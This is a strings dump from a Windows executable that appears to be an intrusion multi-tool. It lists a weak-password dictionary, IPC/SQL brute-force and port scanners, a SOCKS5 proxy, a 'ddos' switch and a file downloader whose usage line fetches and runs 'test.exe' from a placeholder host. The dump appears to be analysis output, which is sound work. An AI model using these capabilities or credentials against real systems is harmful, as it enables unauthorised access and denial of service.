[Strings]
nth  paddr      vaddr      len size section type    string
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0    0x00000000 0x00000000 7   8            ascii   MZ91215
1    0x0000004d 0x0000004d 44  45           ascii   !This program cannot be run in DOS mode.\r\r\n$
2    0x000000c8 0x000000c8 5   6            ascii   Rich}
3    0x000001d8 0x000001d8 5   6            ascii   .text
4    0x000001ff 0x000001ff 7   8            ascii   `.rdata
5    0x00000227 0x00000227 6   7            ascii   @.data
6    0x00000250 0x00000250 5   6            ascii   .rsrc
741  0x0000e6ec 0x0040f2ec 4   5    .text   ascii   E\bS3
742  0x0000e707 0x0040f307 6   7    .text   ascii   0SSSSS
743  0x0000e735 0x0040f335 4   5    .text   ascii   \nBF:
744  0x0000e755 0x0040f355 5   7    .text   utf8    _^[]Ë blocks=Basic Latin,Latin-1 Supplement
745  0x0000e760 0x0040f360 4   5    .text   ascii   M\bV3
746  0x0000e78c 0x0040f38c 5   6    .text   ascii   VVVVV
747  0x0000e7b1 0x0040f3b1 5   7    .text   utf8    3\v]\b3
748  0x0000e7cc 0x0040f3cc 5   6    .text   ascii   WWWWW
749  0x0000e86d 0x0040f46d 6   9    .text   utf8    Vt\bj\n説 blocks=Basic Latin,CJK Unified Ideographs
750  0x0000e9e3 0x0040f5e3 4   6    .text   utf8    YY]Ë blocks=Basic Latin,Latin-1 Supplement
751  0x0000eb3e 0x0040f73e 4   6    .text   utf8    \b\v@}
752  0x0000eb7a 0x0040f77a 4   6    .text   utf8    YY]Ë blocks=Basic Latin,Latin-1 Supplement
753  0x0000ebaa 0x0040f7aa 5   6    .text   ascii   SSSSW
754  0x0000ec52 0x0040f852 5   6    .text   ascii   SSSSW
755  0x0000ed0b 0x0040f90b 7   8    .text   ascii   ^_u\b^_]
756  0x0000ee55 0x0040fa55 4   5    .text   ascii   E\b^_
757  0x0000ee61 0x0040fa61 4   5    .text   ascii   E\b^_
758  0x0000ee73 0x0040fa73 4   5    .text   ascii   E\b^_
759  0x0000ee8d 0x0040fa8d 4   5    .text   ascii   E\b^_
760  0x0000eff1 0x0040fbf1 4   5    .text   ascii   E\b^_
761  0x0000efff 0x0040fbff 4   5    .text   ascii   E\b^_
762  0x0000f015 0x0040fc15 4   5    .text   ascii   E\b^_
763  0x0000f02f 0x0040fc2f 4   5    .text   ascii   E\b^_
764  0x0000f055 0x0040fc55 7   10   .text   utf8    0SSSSS贖 blocks=Basic Latin,CJK Unified Ideographs
765  0x0000f06a 0x0040fc6a 4   6    .text   utf8    9]\fv
766  0x0000f07e 0x0040fc7e 5   6    .text   ascii   @9E\fw
767  0x0000f0ac 0x0040fcac 4   5    .text   ascii   \b@J;
768  0x0000f0bd 0x0040fcbd 4   5    .text   ascii   ?5|\r
769  0x0000f0e1 0x0040fce1 4   5    .text   ascii   @PWV
770  0x0000f0ef 0x0040fcef 5   7    .text   utf8    _^[]Ë blocks=Basic Latin,Latin-1 Supplement
771  0x0000f113 0x0040fd13 4   6    .text   utf8    #ωE\f blocks=Basic Latin,Greek and Coptic
772  0x0000f1f8 0x0040fdf8 4   6    .text   utf8    uЉC\b blocks=Basic Latin,Cyrillic
773  0x0000f220 0x0040fe20 5   6    .text   ascii   PPPPP
774  0x0000f250 0x0040fe50 4   5    .text   ascii   WVU3
775  0x0000f2f6 0x0040fef6 6   7    .text   ascii   v\tN+D$
776  0x0000f316 0x0040ff16 4   9    .text   utf8    ʋӋًȋ blocks=IPA Extensions,Cyrillic,Arabic,Latin Extended-B
777  0x0000f372 0x0040ff72 4   5    .text   ascii   t\vVV
778  0x0000f386 0x0040ff86 6   7    .text   ascii   _VVVVV
779  0x0000f3c1 0x0040ffc1 4   5    .text   ascii   E\bVW
780  0x0000f3ff 0x0040ffff 5   6    .text   ascii   Ht\bHu
781  0x0000f438 0x00410038 4   6    .text   utf8    _^]Ë blocks=Basic Latin,Latin-1 Supplement
782  0x0000f442 0x00410042 4   5    .text   ascii   M\bS3
783  0x0000f449 0x00410049 6   7    .text   ascii   VW|[;\r
784  0x0000f485 0x00410085 5   6    .text   ascii   It\bIu
785  0x0000f4bd 0x004100bd 5   7    .text   utf8    _^[]Ë blocks=Basic Latin,Latin-1 Supplement
786  0x0000f51c 0x0041011c 5   6    .text   ascii   VVVVV
787  0x0000f539 0x00410139 4   5    .text   ascii   j\fh8
788  0x0000f565 0x00410165 7   8    .text   ascii   9^\bu6j\n
789  0x0000f575 0x00410175 4   5    .text   ascii   9^\bu
790  0x0000f5b8 0x004101b8 4   5    .text   ascii   D8\fP
791  0x0000f5cb 0x004101cb 6   8    .text   utf8    3ۋ}\bj\n blocks=Basic Latin,Arabic
792  0x0000f670 0x00410270 4   5    .text   ascii   u9j\n
793  0x0000f6ca 0x004102ca 5   9    .text   utf8    @낋}؋u blocks=Basic Latin,Hangul Syllables,Arabic
794  0x0000f709 0x00410309 4   5    .text   ascii   j@j 
795  0x0000f7de 0x004103de 4   5    .text   ascii   M\bQP
796  0x0000f7fd 0x004103fd 4   6    .text   utf8    xuω5 blocks=Basic Latin,Greek and Coptic
797  0x0000f811 0x00410411 4   5    .text   ascii   E\bPV
798  0x0000f8de 0x004104de 4   5    .text   ascii   ~%9M
799  0x0000f8ef 0x004104ef 6   7    .text   ascii   u\bQVj\t
800  0x0000f90e 0x0041050e 4   5    .text   ascii   r 8^
801  0x0000f9d4 0x004105d4 7   8    .text   ascii   t\rSSSSS
802  0x0000fa11 0x00410611 8   9    .text   ascii   tGHt.Ht&
803  0x0000fa2a 0x0041062a 6   7    .text   ascii   ^SSSSS
804  0x0000fab8 0x004106b8 4   5    .text   ascii   ;t0;
805  0x0000fff2 0x00410bf2 5   7    .text   utf8    \nʈ\b8] blocks=Basic Latin,IPA Extensions
806  0x000100d7 0x00410cd7 6   7    .text   ascii   8VVVVV
807  0x00010150 0x00410d50 4   5    .text   ascii   t(9u
808  0x000101cc 0x00410dcc 5   6    .text   ascii   9X\bu&
809  0x000101f7 0x00410df7 5   6    .text   ascii   9]\bu.
810  0x00010201 0x00410e01 5   6    .text   ascii   SSSSS
811  0x00010237 0x00410e37 5   6    .text   ascii   SSSSS
812  0x0001027c 0x00410e7c 4   5    .text   ascii   ti9]
813  0x000102c7 0x00410ec7 5   6    .text   ascii   r\ff;p
814  0x000102d4 0x00410ed4 4   5    .text   ascii   6f;p
815  0x000102d9 0x00410ed9 5   6    .text   ascii   r0f;p
816  0x0001031e 0x00410f1e 4   5    .text   ascii   tH9]
817  0x00010348 0x00410f48 5   6    .text   ascii   r\ff;H
818  0x00010355 0x00410f55 4   5    .text   ascii   6f;H
819  0x0001035a 0x00410f5a 5   6    .text   ascii   r0f;H
820  0x0001038f 0x00410f8f 4   5    .text   ascii   u!f;
821  0x00010394 0x00410f94 4   5    .text   ascii   t\t9]
822  0x00010406 0x00411006 5   6    .text   ascii   9_\bu&
823  0x00010431 0x00411031 5   6    .text   ascii   9]\bu+
824  0x0001043b 0x0041103b 5   6    .text   ascii   SSSSS
825  0x0001046e 0x0041106e 5   6    .text   ascii   SSSSS
826  0x000104ac 0x004110ac 4   5    .text   ascii   tA9]
827  0x000104bd 0x004110bd 4   5    .text   ascii   t_8]
828  0x000104ff 0x004110ff 4   5    .text   ascii   t 9]
829  0x00010567 0x00411167 5   6    .text   ascii   SVWUj
830  0x0001057c 0x0041117c 4   5    .text   ascii   ]_^[
831  0x00010582 0x00411182 4   6    .text   utf8    ]ËL$ blocks=Basic Latin,Latin-1 Supplement
832  0x00010608 0x00411208 6   7    .text   ascii   ;t$,v-
833  0x00010663 0x00411263 6   7    .text   ascii   R\f9Q\bu
834  0x0001068b 0x0041128b 10  11   .text   ascii   k\fUQPXY]Y[
835  0x000106fb 0x004112fb 4   6    .text   utf8    \n3Ɉ] blocks=Basic Latin,Latin Extended-B
836  0x0001075f 0x0041135f 4   6    .text   utf8    ̋D$\b blocks=Combining Diacritical Marks,Basic Latin
837  0x00010768 0x00411368 7   9    .text   utf8    \vȋL$\fu\t blocks=Basic Latin,Latin Extended-B
838  0x0001077d 0x0041137d 4   6    .text   utf8    ؋D$\b blocks=Arabic,Basic Latin
839  0x00010787 0x00411387 4   6    .text   utf8    ؋D$\b blocks=Arabic,Basic Latin
840  0x000107d0 0x004113d0 4   5    .text   ascii   |\b;5
841  0x000107e6 0x004113e6 5   6    .text   ascii   SSSSS
842  0x00010850 0x00411450 5   6    .text   ascii   9]\ft7
843  0x0001089e 0x0041149e 5   6    .text   ascii   SSSSS
844  0x00010914 0x00411514 5   6    .text   ascii   \ntl9]
845  0x0001093d 0x0041153d 5   6    .text   ascii   \ntC9]
846  0x0001095b 0x0041155b 4   5    .text   ascii   %\nu$
847  0x00010a06 0x00411606 4   5    .text   ascii   <\rt\f
848  0x00010a22 0x00411622 6   7    .text   ascii   8\nu\nAA
849  0x00010b3d 0x0041173d 4   5    .text   ascii   Ht$C
850  0x00010bae 0x004117ae 6   7    .text   ascii   ;E\ft\aP
851  0x00010c28 0x00411828 5   6    .text   ascii   \vCC@@
852  0x00010c44 0x00411844 4   5    .text   ascii   9\nu\r
853  0x00010c92 0x00411892 4   5    .text   ascii   Ht(f
854  0x00010c9c 0x0041189c 4   5    .text   ascii   j\rXf
855  0x00010cde 0x004118de 7   8    .text   ascii   \nt\bj\rXf
856  0x00010d0d 0x0041190d 4   5    .text   ascii   CC+]
857  0x00010da5 0x004119a5 5   6    .text   ascii   VVVVV
858  0x00010e72 0x00411a72 5   6    .text   ascii   u8SS3
859  0x00010eba 0x00411aba 4   5    .text   ascii   t\b@;
860  0x00010ef5 0x00411af5 5   6    .text   ascii   9] u\b
861  0x00010f03 0x00411b03 4   5    .text   ascii   5\fQA
862  0x00010f0a 0x00411b0a 5   6    .text   ascii   9]$SS
863  0x00010f3e 0x00411b3e 4   5    .text   ascii   D?\b=
864  0x00010f9a 0x00411b9a 4   5    .text   ascii   5(PA
865  0x00010fc1 0x00411bc1 4   5    .text   ascii   t)9]
866  0x00010ffd 0x00411bfd 4   5    .text   ascii   D\t\b=
867  0x00011051 0x00411c51 6   7    .text   ascii   t"SS9]
868  0x00011093 0x00411c93 5   6    .text   ascii   9]\bu\b
869  0x0001109e 0x00411c9e 7   8    .text   ascii   E\b9] u\b
870  0x000110e8 0x00411ce8 6   8    .text   utf8    tԋ5,PA blocks=Basic Latin,Cyrillic Supplement
871  0x000111d6 0x00411dd6 4   5    .text   ascii   t\f9E
872  0x00011286 0x00411e86 4   5    .text   ascii   xu\nj
873  0x000112c3 0x00411ec3 4   5    .text   ascii   5\fQA
874  0x000112ca 0x00411eca 5   6    .text   ascii   9] SS
875  0x000112fa 0x00411efa 4   5    .text   ascii   D?\b=
876  0x000113bc 0x00411fbc 4   6    .text   utf8    t܉u\f blocks=Basic Latin,Syriac
877  0x000115ca 0x004121ca 4   6    .text   utf8    ,^]Ë blocks=Basic Latin,Latin-1 Supplement
878  0x000115ff 0x004121ff 4   5    .text   ascii   v\b;5
879  0x0001160f 0x0041220f 4   6    .text   utf8    Y^]Ë blocks=Basic Latin,Latin-1 Supplement
880  0x0001168d 0x0041228d 4   5    .text   ascii   v$;5
881  0x000116b6 0x004122b6 8   9    .text   ascii   PPPPPPPP
882  0x00011718 0x00412318 4   5    .text   ascii   t&:a
883  0x000117be 0x004123be 4   5    .text   ascii   tR:Q
884  0x000117ca 0x004123ca 4   5    .text   ascii   t<:Q
885  0x000117d6 0x004123d6 4   5    .text   ascii   t&:Q
886  0x00011856 0x00412456 8   9    .text   ascii   PPPPPPPP
887  0x00011902 0x00412502 5   7    .text   utf8    L$\b+ȃ blocks=Basic Latin,Latin Extended-B
888  0x00011918 0x00412518 5   7    .text   utf8    L$\b+ȃ blocks=Basic Latin,Latin Extended-B
889  0x00011988 0x00412588 5   9    .text   utf8    3\r}૫j blocks=Basic Latin,Gujarati
890  0x00011a39 0x00412639 9   10   .text   ascii   19u\br"9U\b
891  0x00011a71 0x00412671 4   6    .text   utf8    yщM\b blocks=Basic Latin,Cyrillic
892  0x00011aac 0x004126ac 6   10   .text   utf8    }\r3\r}૫ blocks=Basic Latin,Gujarati
893  0x00011ac7 0x004126c7 5   10   .text   utf8    uԋȍ}ख़ blocks=Basic Latin,Cyrillic Supplement,Latin Extended-B,Devanagari
894  0x00011c16 0x00412816 4   6    .text   utf8    HyދM blocks=Basic Latin,Thaana
895  0x00011ce4 0x004128e4 4   8    .text   utf8    3\r}૫ blocks=Basic Latin,Gujarati
896  0x00011de7 0x004129e7 4   5    .text   ascii   M\b\v}
897  0x00011e2f 0x00412a2f 4   5    .text   ascii   Y+\r,
898  0x00011e45 0x00412a45 4   6    .text   utf8    \vً\r0 blocks=Basic Latin,Arabic
899  0x00011ecc 0x00412acc 5   9    .text   utf8    3\r}૫j blocks=Basic Latin,Gujarati
900  0x00011f7d 0x00412b7d 9   10   .text   ascii   19u\br"9U\b
901  0x00011fb5 0x00412bb5 4   6    .text   utf8    yщM\b blocks=Basic Latin,Cyrillic
902  0x00011ff0 0x00412bf0 6   10   .text   utf8    }\r3\r}૫ blocks=Basic Latin,Gujarati
903  0x0001200b 0x00412c0b 5   10   .text   utf8    uԋȍ}ख़ blocks=Basic Latin,Cyrillic Supplement,Latin Extended-B,Devanagari
904  0x0001215a 0x00412d5a 4   6    .text   utf8    HyދM blocks=Basic Latin,Thaana
905  0x00012228 0x00412e28 4   8    .text   utf8    3\r}૫ blocks=Basic Latin,Gujarati
906  0x0001232b 0x00412f2b 4   5    .text   ascii   M\b\v}
907  0x00012373 0x00412f73 4   5    .text   ascii   Y+\rD
908  0x00012389 0x00412f89 4   6    .text   utf8    \vً\rH blocks=Basic Latin,Arabic
909  0x000123c7 0x00412fc7 4   5    .text   ascii   E\bS3
910  0x000123d3 0x00412fd3 4   5    .text   ascii   E\fF3
911  0x000123fa 0x00412ffa 4   5    .text   ascii   9]$u
912  0x00012404 0x00413004 5   6    .text   ascii   SSSSS
913  0x00012426 0x00413026 11  12   .text   ascii   < t\f<\tt\b<\nt
914  0x0001247c 0x0041307c 4   5    .text   ascii   HHt\r
915  0x000124c4 0x004130c4 9   10   .text   ascii   <+t(<-t$:
916  0x0001253d 0x0041313d 4   6    .text   utf8    *È\aG blocks=Basic Latin,Latin-1 Supplement
917  0x00012597 0x00413197 4   6    .text   utf8    *È\aG blocks=Basic Latin,Latin-1 Supplement
918  0x000125c9 0x004131c9 5   6    .text   ascii   \bw\aj\t
919  0x000125d8 0x004131d8 6   7    .text   ascii   +t HHt
920  0x0001260e 0x0041320e 5   6    .text   ascii   ,1<\bv
921  0x00012671 0x00413271 5   6    .text   ascii   Yj\nYJ
922  0x0001278f 0x0041338f 5   7    .text   utf8    K\n3\tE
923  0x00012797 0x00413397 7   12   .text   utf8    EԉE؉E܋E blocks=Basic Latin,Cyrillic Supplement,Arabic,Syriac
924  0x000127eb 0x004133eb 7   10   .text   utf8    w\r3\tEȉE blocks=Basic Latin,Latin Extended-B
925  0x00012839 0x00413439 5   8    .text   utf8    ủuȉu blocks=Basic Latin,Combining Diacritical Marks,Latin Extended-B
926  0x00012922 0x00413522 5   8    .text   utf8    E܋}؋M blocks=Basic Latin,Syriac,Arabic
927  0x00012a1a 0x0041361a 5   8    .text   utf8    MċuƋU blocks=Basic Latin,Latin Extended-A,Latin Extended-B
928  0x00012a7a 0x0041367a 4   6    .text   utf8    ÐN0A blocks=Latin-1 Supplement,Basic Latin
929  0x00012b8c 0x0041378c 4   5    .text   ascii   @u\ah
930  0x00012ba5 0x004137a5 5   7    .text   utf8    u;h܀A blocks=Basic Latin,Syriac
931  0x00012bb4 0x004137b4 5   7    .text   utf8    u,hԀA blocks=Basic Latin,Cyrillic Supplement
932  0x00012bcd 0x004137cd 7   8    .text   ascii   t\rVVVVV
933  0x00012be1 0x004137e1 4   6    .text   utf8    *h̀A blocks=Basic Latin,Combining Diacritical Marks
934  0x00012bf9 0x004137f9 7   8    .text   ascii   t\rVVVVV
935  0x00012c9f 0x0041389f 4   5    .text   ascii   f9\br
936  0x00012cb7 0x004138b7 5   7    .text   utf8    P\n3ɉM blocks=Basic Latin,Latin Extended-B
937  0x00012d58 0x00413958 4   5    .text   ascii   u\t9p
938  0x00012f71 0x00413b71 5   7    .text   utf8    wK3\tE
939  0x00012ff4 0x00413bf4 4   5    .text   ascii   u\t9E
940  0x00013314 0x00413f14 4   6    .text   utf8    \vʍ4? blocks=Basic Latin,IPA Extensions
941  0x0001334b 0x00413f4b 4   5    .text   ascii   K<5}
942  0x00013356 0x00413f56 4   5    .text   ascii   ;9u\t
943  0x0001335c 0x00413f5c 4   5    .text   ascii   0K;]
944  0x00013392 0x00413f92 4   6    .text   utf8    À;0u blocks=Latin-1 Supplement,Basic Latin
945  0x000135b2 0x004141b2 5   7    .text   utf8    \vIE\f;
946  0x000137f5 0x004143f5 6   7    .text   ascii   3M\f\vE\f
947  0x00013861 0x00414461 4   5    .text   ascii   SVW3
948  0x00013a16 0x00414616 4   7    .text   utf8    u\bV褺 blocks=Basic Latin,CJK Unified Ideographs
949  0x00013a80 0x00414680 4   6    .text   utf8    _^]Ë blocks=Basic Latin,Latin-1 Supplement
950  0x00013b24 0x00414724 5   6    .text   ascii   _^[u\a
951  0x00013b46 0x00414746 4   5    .text   ascii   E\bV3
952  0x00013b54 0x00414754 5   6    .text   ascii   VVVVV
953  0x00013b84 0x00414784 4   5    .text   ascii   VW9]
954  0x00013b9a 0x0041479a 5   6    .text   ascii   9]\bu.
955  0x00013ba4 0x004147a4 5   6    .text   ascii   SSSSS
956  0x00013be3 0x004147e3 5   6    .text   ascii   SSSSS
957  0x00013c79 0x00414879 6   7    .text   ascii   u99u\bu
958  0x00013c85 0x00414885 5   6    .text   ascii   VVVVV
959  0x00013c9e 0x0041489e 7   9    .text   utf8    '9u\ft܁} blocks=Basic Latin,Syriac
960  0x00013d38 0x00414938 6   8    .text   utf8    E܋E\bW3 blocks=Basic Latin,Syriac
961  0x00013daa 0x004149aa 4   5    .text   ascii   D6\b=
962  0x00013e58 0x00414a58 5   6    .text   ascii   WWWWV
963  0x00013e6a 0x00414a6a 4   5    .text   ascii   t<Vj
964  0x00013e7b 0x00414a7b 7   8    .text   ascii   t+WWVPV
965  0x00013f15 0x00414b15 5   6    .text   ascii   9]\bu.
966  0x00013f1f 0x00414b1f 5   6    .text   ascii   SSSSS
967  0x00013f55 0x00414b55 5   6    .text   ascii   SSSSS
968  0x00013fe2 0x00414be2 6   7    .text   ascii   u09u\bu
969  0x00013fee 0x00414bee 5   6    .text   ascii   VVVVV
970  0x00014007 0x00414c07 5   6    .text   ascii   \e9u\ft
971  0x00014022 0x00414c22 4   6    .text   utf8    \f^]Ë blocks=Basic Latin,Latin-1 Supplement
972  0x0001404d 0x00414c4d 5   6    .text   ascii   p\b9u\f
973  0x0001406f 0x00414c6f 5   7    .text   utf8    \e\vыH\b blocks=Basic Latin,Cyrillic
974  0x000140b6 0x00414cb6 5   7    .text   utf8    3ۉ89] blocks=Basic Latin,Arabic
975  0x0001411c 0x00414d1c 5   7    .text   utf8    U\b\vމ\b blocks=Basic Latin,Thaana
976  0x0001419e 0x00414d9e 5   7    .text   utf8    9p\btջ blocks=Basic Latin,Armenian
977  0x000141a9 0x00414da9 4   5    .text   ascii   X\bu0
978  0x0001420b 0x00414e0b 6   7    .text   ascii   E\b@tH9
979  0x00014291 0x00414e91 4   5    .text   ascii   \at'\n
980  0x00014658 0x00415258 8   9    .rdata  ascii   !@#$%^&*
981  0x00014664 0x00415264 6   7    .rdata  ascii   123qwe
982  0x0001466c 0x0041526c 8   9    .rdata  ascii   12345678
983  0x00014678 0x00415278 6   7    .rdata  ascii   123456
984  0x00014680 0x00415280 4   5    .rdata  ascii   1234
985  0x00014690 0x00415290 8   9    .rdata  ascii   password
986  0x0001469c 0x0041529c 6   7    .rdata  ascii   passwd
987  0x000146a4 0x004152a4 4   5    .rdata  ascii   pass
988  0x000146ac 0x004152ac 6   7    .rdata  ascii   server
989  0x000146b8 0x004152b8 4   5    .rdata  ascii   test
990  0x000146c0 0x004152c0 8   9    .rdata  ascii   database
991  0x000146cc 0x004152cc 4   5    .rdata  ascii   data
992  0x000146d8 0x004152d8 5   6    .rdata  ascii   guest
993  0x000146e0 0x004152e0 4   5    .rdata  ascii   user
994  0x000146e8 0x004152e8 5   6    .rdata  ascii   admin
995  0x000146f0 0x004152f0 13  14   .rdata  ascii   administrator
996  0x00014708 0x00415308 60  61   .rdata  ascii   Usage of HGet: %s <HTTPFile|FTPFile> <LocalFile> [run]\n\n%s%s
997  0x00014748 0x00415348 50  51   .rdata  ascii       hget http://www.xxx.com/test.exe test.exe run\n
998  0x0001477c 0x0041537c 55  56   .rdata  ascii       hget ftp://user:pass@ftp.xxx.com/test.exe test.exe\n
999  0x000147b4 0x004153b4 24  25   .rdata  ascii   Usage of Pskill: %s PID\n
1000 0x000147d0 0x004153d0 6   7    .rdata  ascii   pskill
1001 0x000147d8 0x004153d8 7   8    .rdata  ascii   -pskill
1002 0x000147e0 0x004153e0 6   7    .rdata  ascii   pslist
1003 0x000147e8 0x004153e8 7   8    .rdata  ascii   -pslist
1004 0x000147f0 0x004153f0 4   5    .rdata  ascii   hget
1005 0x000147f8 0x004153f8 5   6    .rdata  ascii   -hget
1006 0x00014804 0x00415404 5   6    .rdata  ascii   hscan
1007 0x0001480c 0x0041540c 6   7    .rdata  ascii   -hscan
1008 0x00014818 0x00415418 4   5    .rdata  ascii   ddos
1009 0x00014820 0x00415420 5   6    .rdata  ascii   -ddos
1010 0x0001482c 0x0041542c 6   7    .rdata  ascii   socks5
1011 0x00014834 0x00415434 7   8    .rdata  ascii   -socks5
1012 0x00014844 0x00415444 4   5    .rdata  ascii   -hbs
1013 0x00014850 0x00415450 4   5    .rdata  ascii   -hmb
1014 0x00014858 0x00415458 8   9    .rdata  ascii   enumhost
1015 0x00014864 0x00415464 9   10   .rdata  ascii   -enumhost
1016 0x00014870 0x00415470 4   5    .rdata  ascii   enum
1017 0x00014878 0x00415478 5   6    .rdata  ascii   -enum
1018 0x00014884 0x00415484 5   6    .rdata  ascii   -help
1019 0x0001488c 0x0041548c 6   7    .rdata  ascii   -usage
1020 0x00014894 0x00415494 7   8    .rdata  ascii   %s -run
1021 0x0001489c 0x0041549c 21  22   .rdata  ascii   \n[-] Received Ctrl+C\n
1022 0x000148b4 0x004154b4 32  33   .rdata  ascii   \t-pskill         Kill a Process\n
1023 0x000148d8 0x004154d8 30  31   .rdata  ascii   \t-pslist         List Process\n
1024 0x000148f8 0x004154f8 43  44   .rdata  ascii   \t-hscan          Ping/Name/SQL/IPC Scanner\n
1025 0x00014924 0x00415524 36  37   .rdata  ascii   \t-enumhost       Enum Network Hosts\n
1026 0x0001494c 0x0041554c 37  38   .rdata  ascii   \t-hbs            Port Banner Scanner\n
1027 0x00014974 0x00415574 42  43   .rdata  ascii   \t-hmb            Domain MX Banner Finder\n 
1028 0x000149a0 0x004155a0 31  32   .rdata  ascii   \t-socks5         Socks5 Proxy\n 
1029 0x000149c0 0x004155c0 35  36   .rdata  ascii   \t-hget           Get HTTP/FTP File\n
1030 0x000149e4 0x004155e4 21  22   .rdata  ascii   [Usage of Function:]\n
1031 0x000149fc 0x004155fc 12  13   .rdata  ascii   Opened %s.\r\n
1032 0x00014a0c 0x0041560c 4   5    .rdata  ascii   open
1033 0x00014a14 0x00415614 43  44   .rdata  ascii   \r\nDownloaded %.1f kb to %s @ %.1f kb/sec.\r\n
1034 0x00014a4f 0x0041564f 36  37   .rdata  ascii   A\rDownload %10d byte Transferred...\r
1035 0x00014a74 0x00415674 27  28   .rdata  ascii   File download:(%s -> %s).\r\n
1036 0x00014a90 0x00415690 23  24   .rdata  ascii   Bad url, or DNS error.\n
1037 0x00014aa8 0x004156a8 24  25   .rdata  ascii   Mozilla/4.0 (compatible)
1038 0x00014ac4 0x004156c4 7   8    .rdata  ascii   Error!\n
1039 0x00014acc 0x004156cc 61  62   .rdata  ascii   \r\n[+] Check %d Domain, found %d MX record, found %d banner.\r\n
1040 0x00014b0c 0x0041570c 24  25   .rdata  ascii   [-] WSAStartup error:%d\n
1041 0x00014b28 0x00415728 43  44   .rdata  ascii   Usage of Domain MX Banner: -hmb DomainName\n
1042 0x00014b54 0x00415754 18  19   .rdata  ascii   IP address Error.\n
1043 0x00014b68 0x00415768 28  29   .rdata  ascii   \nmain() scan CreateThread:%d
1044 0x00014b88 0x00415788 28  29   .rdata  ascii   \nmain() port CreateThread:%d
1045 0x00014ba8 0x004157a8 14  15   .rdata  ascii   malloc error!\n
1046 0x00014bb8 0x004157b8 11  12   .rdata  ascii   \nScan %s\r\n\n
1047 0x00014bc8 0x004157c8 599 600  .rdata  ascii   [Usage:]\n    -hbs <HostName>|<StartIP[-EndIP]> [Options]\n\n[Options:]\n    /b             Get Banner for many ports scan\n    /c             Check Web Version\n    /n             Note Port Open\n    /o             Scan Port Only\n    /w             Scan Web Version Only\n    /d <Delay>     TCP connect timeout, between 1-20, default is %d\n    /l <Logfile>   Log file name, default is %s\n    /m [Ports]     Scan many ports, default will scan %d ports\n    /p <Port>      Scan port, default is %d\n    /s <String>    Scan sensitive string\n    /t <Thread>    Scan thread number, between 1-1000, default is %d\n\n
1048 0x00014e20 0x00415a20 7   8    .rdata  ascii   hbs.txt
1049 0x00014e28 0x00415a28 28  29   .rdata  ascii   WSAStartup failed! Error:%d\n
1050 0x00014e4c 0x00415a4c 7   8    .rdata  ascii   -listen
1051 0x00014e58 0x00415a58 8   9    .rdata  ascii   -connect
1052 0x00014e64 0x00415a64 7   8    .rdata  ascii   [-] %s\n
1053 0x00014e6c 0x00415a6c 32  33   .rdata  ascii   I Can't use Local IP for ReBind!
1054 0x00014e90 0x00415a90 9   10   .rdata  ascii   127.0.0.1
1055 0x00014ea0 0x00415aa0 5   6    .rdata  ascii   -bind
1056 0x00014ea8 0x00415aa8 10  11   .rdata  ascii   [Option:]\n
1057 0x00014eb8 0x00415ab8 63  64   .rdata  ascii       -s -listen [ConnectPort] [ListenPort]       Default:%d %d\n\n
1058 0x00014ef8 0x00415af8 59  60   .rdata  ascii       -s -connect ConnectHost [ConnectPort]       Default:%d\n
1059 0x00014f38 0x00415b38 63  64   .rdata  ascii       -s -bind [ReBindIP] [BindPort]              Default:ALL %d\n
1060 0x00014f78 0x00415b78 26  27   .rdata  ascii   [Usage of Socks5 Proxy:]\r\n
1061 0x00014f94 0x00415b94 27  28   .rdata  ascii   \nmain() ReleaseSemaphore:%d
1062 0x00014fb0 0x00415bb0 16  17   .rdata  ascii   \nOpen Logfile:%d
1063 0x00014fc4 0x00415bc4 19  20   .rdata  ascii   \nCreateSemaphore:%d
1064 0x00014fd8 0x00415bd8 12  13   .rdata  ascii   IcmpSendEcho
1065 0x00014fe8 0x00415be8 15  16   .rdata  ascii   IcmpCloseHandle
1066 0x00014ff8 0x00415bf8 14  15   .rdata  ascii   IcmpCreateFile
1067 0x00015008 0x00415c08 8   9    .rdata  ascii   ICMP.DLL
1068 0x00015014 0x00415c14 26  27   .rdata  ascii   Open Password file error!\n
1069 0x00015038 0x00415c38 539 540  .rdata  ascii   [Usage:]\n    -hscan <HostName|<StartIP[-EndIP]> [Options]\n\n[Options:]\n    /a             Scan All, default OFF\n    /c             Check host state, Ping first\n    /f             Faster Scan\n    /i             IPC User Scan\n    /n             Name Scan\n    /p             Ping Scan\n    /s             SQL User Scan\n    /d <Delay>     Set timeout, between 1-20, default is %d\n    /l <Logfile>   Log file name, default is %s\n    /t <Thread>    Scan thread number, between 1-1000, default is %d\n    /D <file>      Scan use password dictionary\n
1070 0x00015254 0x00415e54 20  21   .rdata  ascii   %3d.%02d.%02d.%03d\r\n
